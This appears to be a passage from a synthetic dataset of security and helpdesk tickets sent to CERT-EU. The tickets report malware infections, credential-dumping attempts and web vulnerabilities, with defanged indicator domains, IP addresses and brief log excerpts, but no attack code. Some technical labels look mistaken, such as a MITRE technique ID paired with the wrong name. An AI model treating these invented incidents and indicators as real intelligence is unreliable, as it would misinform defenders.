Specifically, we observed that the analytics tool\u2019s OAuth implementation does not properly validate redirect URIs, which could allow for an open redirect or even token interception if exploited. \n\nThe issue was initially detected on 3 July 2024, while testing custom dashboards for investment optimization. Our security logs indicate that the analytics tool accepts arbitrary redirect_uri parameters during the OAuth flow, enabling an attacker to potentially capture access tokens by redirecting users to a malicious endpoint. No exploitation has been observed so far, but the risk is considerable given the sensitivity of investment data processed by the CRM.\n\nWe have attached a technical report (oauth_redirect_validation_issue.pdf) detailing our findings, including step-by-step reproduction instructions and sample HTTP requests. In line with NIS2 and GDPR compliance, we have temporarily restricted integrations with the affected analytics platform pending further investigation.\n\nWe request CERT-EU\u2019s guidance on coordinated disclosure to the vendor and any recommendations for immediate risk mitigation.

One user (Dr. Conti) reported that her session terminated unexpectedly and she was logged out, even though she hadn\u2019t touched anything.\n\nOur local IT support checked the system and found a PowerShell script executing from C:\\Users\\Public\\lib\\update_cache.ps1, which is not something we recognize or have deployed. The process tree (from Sysmon) shows the script being launched by a parent process called msedge.exe, which I guess is the Edge browser? We don\u2019t normally allow Edge to run scripts, so that\u2019s odd.\n\nIn the event logs, there are multiple entries for outbound connections to IP 217.160.48.119 over TCP/8088, initiated by PowerShell. The script itself tries to download a file named update.exe from hxxp://cdn-eu1[.]fileshare[.]eu/downloads/ and then creates a scheduled task called \u201cCacheUpdater\u201d.\n\nWe immediately disconnected the workstation from the lab network and ran a basic AV scan (Windows Defender), which detected \u2018Trojan:Win32/Emotet.B\u2019 and quarantined update.exe, but I\u2019m not sure if that\u2019s the end of it. No other workstations in the immediate vicinity are showing alerts yet, but I\u2019m worried about lateral movement or data loss. The shared folder D:\\Projects\\EU-BioData\\ is accessible from this host and contains project files for the EU-wide research collaboration, some of which are confidential.\n\nWe\u2019ve collected relevant logs (Sysmon, Windows Event Viewer, Defender logs), and I\u2019m attaching a sample here (\u2018bio-analyt05_logs_20240715.zip\u2019). Our IT said they saw attempts to create new local user accounts (user: temp_svc) right before we unplugged the device.\n\nWe\u2019re not sure how the script got there \u2013 Dr. Conti mentioned she downloaded a PDF from an external conference site earlier in the day, but nothing looked suspicious. No suspicious emails reported either.\n\nPlease advise on next steps: should we reimage the workstation? Do we need to scan other lab PCs, or notify project partners? We\u2019re a bit out of our depth on this, so any help is appreciated.

Over the past week, our research group at KU Leuven has been tracking a new ransomware affiliate recruitment thread on a Russian-language forum (see attached screenshots, TLP:GREEN). The actor, using the alias \u201ccyberCossack\u201d, is advertising access to compromised EU municipal networks, specifically mentioning Belgian and Dutch city councils.

Despite several remediation attempts\u2014including full software reinstalls, profile resets, and validation of OS integrity\u2014the issue remains unresolved and appears to be spreading incrementally to additional endpoints.\n\nInitial telemetry analysis suggests that the affected applications are being terminated abruptly, with event logs showing anomalous DLL injections and unexpected child process spawns shortly before each halt. Notably, several crash reports reference the loading of unsigned modules from the user\u2019s temp directory, and in at least three cases, we identified outbound traffic to defanged domains such as hxxps://aud-update[.]syncserve[.]net and hxxps://skp-connect[.]relaymail[.]org.

These nodes appear to be running custom Scikit-learn models for rapid identification of arbitrage opportunities and market-moving events, which are then used to inform coordinated trading activity and, in some cases, disinformation operations via automated botnets.\n\nOur reverse engineering of several captured binaries (see attached ZIP with SHA256 hashes and YARA signatures) indicates that at least two financially motivated groups\u2014one with moderate confidence attributed to \"Silent Ledger\"\u2014are orchestrating these campaigns. MITRE ATT&CK techniques observed include T1609 (Container Administration Command), T1589.002 (Gather Victim Identity Information: Financial), and T1566.002 (Spearphishing via Service).\n\nWe have also identified several domains and IPs linked to this activity (see attached CSV), including hxxps://ml-trade-bot[.]net and hxxps://eu-arbitrage[.]cloud. These indicators have not yet been flagged in major threat feeds, so we are sharing them proactively in line with NIS2 threat sharing requirements. Please note that our findings suggest a growing trend of adversaries using legitimate data science tools for illicit financial gain and market manipulation within the EU regulatory environment.\n\nWe would appreciate any additional intelligence on:\n- Overlap with known campaigns targeting EU financial sector entities\n- Further infrastructure or TTPs linked to \"Silent Ledger\" or similar groups\n- Recommendations for detection and mitigation, especially regarding abuse of open-source ML frameworks\n\nIf you have observed similar patterns or can enrich our indicators, your input would be highly valuable. Please let us know if you require full packet captures, additional malware samples, or a MISP export for further analysis.

The engagement is set to begin on 2 July and run through 5 July, with all test traffic originating from the IP range 198.51.100.32/28 as previously agreed.\n\nAs part of the pre-engagement planning phase, we have encountered an issue that requires your input before proceeding. Specifically, our team is unable to validate the readiness of our new Secure Remote Access Gateway (SRAG) for inclusion in the scope of the test. The SRAG (hosted at hxxps://remote.eesc.europa.eu) was recently deployed to replace our legacy VPN solution, and while initial configuration reviews suggest compliance with baseline security standards, we have not yet completed a full audit of the access control policies and multi-factor authentication (MFA) integration.\n\nGiven the gateway\u2019s critical role in facilitating remote access for staff and external partners, we are concerned about the risk of inadvertent service disruption or exposure of sensitive authentication flows during the active penetration test. We would appreciate your guidance on the following points:\n\n1. Can the SRAG be safely included in the initial test scope, or would you recommend a phased approach (e.g., initial reconnaissance only, with exploitation attempts deferred until post-MFA audit)?\n2. Are there specific artefacts or configuration exports we should provide to facilitate risk-aware testing (e.g., sanitized policy configs, sample authentication logs)?\n3. Would it be possible to schedule a short pre-test call to clarify the engagement boundaries and agree on real-time communication channels for incident response?\n\nWe have attached a summary of the current SRAG configuration (see: SRAG_Config_Summary_20240625.pdf) for your reference. Please let us know if additional documentation or access is required. Our aim is to ensure that the penetration test delivers maximum value while minimizing the risk of operational impact, especially in light of ongoing hybrid work arrangements.\n\nThank you in advance for your support and expertise.

The process was launched by the SYSTEM account and subsequently initiated multiple outbound connections to the external IP address 91.207.58.12, which is not recognized as part of our trusted network perimeter.\n- Concurrently, Sysmon logs captured several PowerShell script executions leveraging encoded command parameters. One of the scripts attempted to enumerate user sessions and extract data from a mapped network share containing pseudonymised patient datasets (directory: \\\\research-nas\\patient_data2024).\n- We also observed a spike in outbound traffic volume between 03:42 and 03:46 CET, with a significant portion directed to hxxps://meddata-transfer[.]pro. The destination domain is not on our allowlist and is flagged by Threat Intelligence feeds as potentially malicious.\n\nPreliminary Analysis:\n- The server in question was running outdated Windows Server 2016 patches, and our vulnerability scanner had previously flagged it for missing KB5024286 (May 2024 cumulative update). Initial review suggests possible exploitation of CVE-2024-21338 (Win32k privilege escalation).\n- Our internal SIEM (Elastic Stack) indicates that SYSTEM privileges were used to access and attempt to compress several large CSV files from the patient data share, but we have not yet confirmed full data exfiltration.\n- Authentication logs show failed login attempts from the same external IP prior to the binary execution, targeting the 'svc_medadmin' service account.\n\nActions Taken So Far:\n- Isolated medrec-02 from the internal network and disabled the affected service account.\n- Collected volatile memory and disk images for forensic preservation (see attachments: 'medrec02_memdump.bin', 'sysmon_events_20240620.log').\n- Informed the Data Protection Officer for preliminary GDPR assessment, given the sensitivity of the datasets involved.\n\nAssistance Requested:\n- Urgent review of attached forensic artefacts to confirm method of compromise and assess potential data exfiltration scope.\n- Guidance on notification requirements under NIS2 and any immediate remediation steps you recommend.\n- Coordination with relevant law enforcement if external actors are confirmed.\n\nPlease confirm receipt of this report and indicate if additional information is required.

The issue was first noticed when several scheduled posts failed to publish, and diagnostic logs indicated repeated authentication errors and unexpected API calls to unfamiliar endpoints (see attached network trace extract).\n\nTechnical Details:\nUpon investigation, we discovered that the affected integration modules (specifically, the 'EuroSocial' connector v3.2.7) were making outbound connections to hxxps://api-social-sync[.]org and hxxps://cdn-metrics[.]net, neither of which are part of our approved service list. These endpoints have been associated in recent CTI reports (ref: MISP event #2741, TLP:AMBER) with a campaign attributed to the \"Blue Antelope\" threat group, known for targeting EU institutional branding assets.\n\nInitial remediation steps included:\n- Restarting the impacted campaign management servers\n- Rolling back to previous plugin versions\n- Blocking outbound traffic to the identified suspicious domains at the firewall level\n\nDespite these actions, we continue to observe attempted connections and sporadic service interruptions, raising concerns about persistence mechanisms or additional compromised components. The incident currently impacts several ongoing EU-wide awareness initiatives, with potential reputational risk if campaign messaging is further disrupted or manipulated.\n\nAssistance Requested:\nWe are seeking:\n- Any intelligence you may have regarding recent Blue Antelope activity or associated infrastructure\n- Enrichment of the attached IOC list (IPs, domains, plugin hashes)\n- Guidance on further containment and monitoring steps, especially in line with NIS2 requirements for digital service providers\n\nFor your reference, attached is a zipped archive containing relevant server logs, a CSV of observed suspicious connections, and the affected plugin binaries for malware analysis. All information is shared under TLP:AMBER, and we are prepared to provide additional artefacts if required.\n\nPlease advise on any sector-specific advisories or trends relating to supply chain compromise via digital marketing integrations.

We\u2019ve run into something odd this afternoon (09/07/2024, around 14:20 CET) on one of our analyst workstations (hostname: EUROPOL-WS12). One of our junior staff, Petra Novak, reported her laptop being unusually slow and the fan running at max, even though she was only using Outlook and our case management system.\n\nWhen I remoted in, I saw a suspicious process in Task Manager (powershell.exe running as SYSTEM), which kept popping back up even after being killed.

The outbound connection is blocked by our firewall now, but not before several attempts were logged. Our EDR (CrowdStrike) flagged this as a possible fileless malware infection, but hasn\u2019t quarantined anything yet. No obvious signs of lateral movement, but a couple of other hosts (EUROPOL-WS09 and WS14) show similar command lines, so this might be spreading.\n\nImmediate steps we\u2019ve taken:\n- Isolated the affected workstations from the network\n- Disabled the user accounts on those machines as a precaution\n- Grabbed full memory dumps and exported the relevant [Sysmon] logs (attached)\n\nWe haven\u2019t found any evidence of data exfiltration so far, but we\u2019re not sure what the payload does yet.

We\u2019ve received a formal request from the Belgian Ministry of Interior, who require official confirmation of Ms. Marieke Janssen\u2019s employment period and role at CERT-EU for their security clearance renewal procedure. \n\nI\u2019ve checked the internal HR portal and couldn\u2019t locate a template or clear instructions for external reference letters, especially for secondees who were part of cross-institutional projects. The Ministry\u2019s letter (attached as PDF) specifies that the confirmation should include start/end dates, project assignment, and a brief outline of duties. They\u2019ve also asked for the document to be signed and stamped by an authorised HR representative.\n\nCould you please advise on the following:\n- Is there a standard procedure or form for this type of request, or should we draft the letter manually?\n- Who should be listed as the signatory (Head of HR, or the project lead)?\n- Do you require any additional documentation from our side (e.g., Ms. Janssen\u2019s contract, project assignment letter)?\n\nThe Ministry has requested the letter by next Friday, so I\u2019d appreciate your guidance on how to proceed to avoid any delays. If it\u2019s easier, I\u2019m happy to jump on a quick Teams call to clarify the details. \n\nLet me know if you need the original request forwarded or any other info from our archives. Thanks a lot for your help \u2013 this isn\u2019t a super frequent request on our end, so apologies if I\u2019ve missed any obvious steps!\n\nBest regards,\n\nTomasz Nowak\nAdministrative Officer\nENISA Liaison Unit\nEuropean Union Agency for Cybersecurity\n\n\u2014\nAttachment: Letter_Request_BelgianMinistry[.]pdf", "created_date": "2025-04-02T00:00:00", "email_address": "tomasz.nowak@enisa.europa.eu", "assigned_queue": "SMS"}
{"ticket_id": "TKT-C147AF16", "title": "Deserialization Vulnerability in Project Management Platform Session Handling (Post-Update v5.12.4", "content": "Dear CERT-EU Vulnerability Disclosure Team,\n\nI am submitting this report as part of our internal vulnerability management process following a routine assessment of the collaborative project management platform used across several DGs. Post-deployment of the most recent software update (v5.12.4, deployed 2024-05-29), we have observed repeated instability and degraded performance, manifesting as slow load times and intermittent crashes for authenticated users.\n\nUpon further inspection, our technical team identified that the root cause may be related to a deserialization vulnerability in the application\u2019s session management logic. Specifically, the backend appears to be improperly handling serialized user session tokens, which are exchanged between the client and server during project board operations. During testing, we were able to manipulate serialized data in the session cookie, resulting in application crashes and, in one controlled scenario, limited arbitrary code execution in the application context (see attached PoC and crash logs).\n\nThe affected endpoint is:\n\n- hxxps://pmtools-internal[.]ec.europa.eu/api/session/restore\n\nThe vulnerability seems to be exacerbated by the recent update, which introduced a new session persistence module without adequate input validation or integrity checks. We have attached technical details, sample requests, and anonymised logs for your review. No exploitation has been observed in production, and no user data appears to have been exfiltrated at this stage. However, we consider this a high-severity issue due to the potential for privilege escalation or lateral movement if exploited by a threat actor with network access.\n\nIn line with CERT-EU\u2019s Coordinated Vulnerability Disclosure policy and our obligations under NIS2, we request guidance on public disclosure timelines and would appreciate support with vendor coordination if required. We are prepared to assist with further technical validation or provide additional forensic data if needed.\n\nThank you for your attention to this matter. Please let us know the next steps.\n\nBest regards,\n\nKatarina M\u00fcller\nIT Security Officer, DG DIGIT", "created_date": "2024-12-15", "email_address": "katarina.mueller@ec.europa.eu", "assigned_queue": "OFFSEC::CVD"}
{"ticket_id": "TKT-66B389D5", "title": "Unauthenticated Access to Investment Analytics Metrics via REST API Endpoints", "content": "Dear CERT-EU Vulnerability Disclosure Team,\n\nI am reaching out from the DG ECFIN IT Security Office to report a vulnerability identified during an internal review of our investment analytics dashboard. While conducting a routine assessment as part of our ongoing compliance with NIS2, I discovered that several endpoints within the dashboard\u2019s REST API (notably /metrics/timeseries and /performance/track) lack sufficient input validation and authentication enforcement. This could allow an unauthorised actor to craft requests and access detailed performance metrics across different portfolios, potentially exposing sensitive financial strategy data.\n\nTo verify the issue, I executed a series of curl-based test requests from an unauthorised context and was able to retrieve historic investment data. While no direct modification was observed, the exposure of these analytics may facilitate reconnaissance or competitive intelligence gathering. I have attached a brief report with sanitized API request/response samples and log extracts for your reference.\n\nWe recommend reviewing the API authentication layer and implementing stricter access controls for all analytics endpoints, especially those returning time-series or strategy performance data. Please confirm receipt of this report and advise on coordinated disclosure timelines as per CERT-EU\u2019s CVD policy. We are available for further technical discussion and can assist with additional testing if necessary.\n\nKind regards,\n\nAnna M\u00fcller\nIT Security Specialist, DG ECFIN", "created_date": "2025-01-01", "email_address": "anna.mueller@ec.europa.eu", "assigned_queue": "OFFSEC::CVD"}

The system flagged a sequence of anomalous activities on domain controller 'eu-parl-ad03.strasb.intra' at approximately 04:26 CET this morning (see attached event extract below).\n\nInitial detection came via a triggered rule for 'unusual LSASS memory access' by a non-standard administrative account ('adm-bernard'). This account was only recently provisioned and, according to our records, should not be in use outside scheduled maintenance windows (which ended at 02:00 CET). The process tree indicates use of a renamed PowerShell binary ('pwsh-upd.exe'), launching a series of scripts with encoded commands. One script attempted to inject code into 'lsass.exe', followed by the creation of a new domain admin group ('EU-TempOps') and assignment of several standard user accounts to this group.\n\nRelevant log snippet:\n[2024-07-29 04:26:17 CET] Process: pwsh-upd.exe (PID 4340) launched by adm-bernard\n[2024-07-29 04:26:21 CET] Suspicious access: lsass.exe memory read\n[2024-07-29 04:26:25 CET] New group created: EU-TempOps\n[2024-07-29 04:26:28 CET] User accounts added: user_riviera, user_olsson\n\nNo corresponding change requests or scheduled tasks exist for this time, and our SIEM (Splunk) correlates these events with a successful RDP session from an external IP (109.88.14.207), which is not on our trusted networks list. The session appears to have originated from a VPN endpoint in a non-EU country.\n\nActions taken so far:\n- Disabled 'adm-bernard' account\n- Revoked RDP access to all domain controllers\n- Preserved volatile memory image and Windows event logs for eu-parl-ad03\n- Notified local IT support to keep the host powered on but isolated\n\nWe require urgent assistance to determine if this was an attempted credential dump or successful privilege escalation, and to assess possible lateral movement or data access. Please advise on forensic steps and coordination with Strasbourg site security. Full CrowdStrike report and Splunk logs are attached in the secure share.\n\nRegards,\n\nMonika Zajac\nIT Security Analyst\nEuropean Parliament \u2013 Strasbourg\nmonika.zajac@ep.europa.eu", "created_date": "2024-11-02T00:00:00", "email_address": "monika.zajac@ep.europa.eu", "assigned_queue": "DFIR::incidents"}
{"ticket_id": "TKT-D3C26E42", "title": "Potential IDOR in ecoaud Document Management System Allows Metadata Tampering \u2013 User Reported", "content": "Hi CERT-EU CVD team,\n\nI\u2019m reaching out from the IT Service Desk at the European Court of Auditors after one of our users flagged some odd behaviour in the internal document management system (dms.ecoaud[.]eu). I\u2019m not a security specialist, but after discussing with our local IT support, we thought it best to forward this to your team for proper assessment.\n\nThe issue: when accessing certain archived reports, users are able to modify the document metadata (like author and timestamp) even though these records are supposed to be read-only. This seems to happen if you change the document ID parameter in the URL (e.g., dms.ecoaud[.]eu/view?id=XXXX). There\u2019s no authentication prompt or warning \u2013 just direct access and edit capability. We haven\u2019t tried anything too technical, but it looks like anyone logged into the system can alter metadata for any document, not just their own.\n\nI\u2019ve attached a couple of screenshots showing before/after states and the URL pattern. No special tools used, just Chrome and Firefox. We\u2019re concerned this could be a case of insecure direct object reference (IDOR), but again, not experts here.\n\nNo evidence of misuse so far, but with the sensitive nature of audit documents, we\u2019d appreciate guidance on next steps. Should we restrict access or take the system offline while this is being investigated? Our users rely on the platform daily, so downtime is tricky.\n\nPlease let us know what info you need or if you want to set up a call. We\u2019d also like advice on how to communicate this internally without causing unnecessary alarm.\n\nThanks in advance for your help!\n\nBest regards,\n\nMarta Kov\u00e1cs\nIT Service Desk\nEuropean Court of Auditors\nmarta.kovacs@eca.europa.eu", "created_date": "2025-02-02T00:00:00", "email_address": "marta.kovacs@eca.europa.eu", "assigned_queue": "OFFSEC::CVD"}
